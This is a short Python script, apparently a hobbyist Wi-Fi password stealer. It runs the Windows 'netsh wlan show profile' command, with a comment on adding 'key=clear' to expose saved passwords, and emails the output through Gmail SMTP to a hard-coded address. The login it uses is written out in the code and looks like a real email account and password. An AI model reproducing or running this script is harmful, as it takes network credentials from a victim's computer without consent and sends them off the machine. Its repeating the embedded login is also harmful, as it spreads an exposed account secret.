import subprocess , smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile "
# use "__<network name> key=clear to reveal the password in the email"
result = subprocess.check_output(command, shell=True)
# Enable the third party access lock on your gmail.
send_mail("ckeve911@gmail.com", "Ginalinetti@99", result)


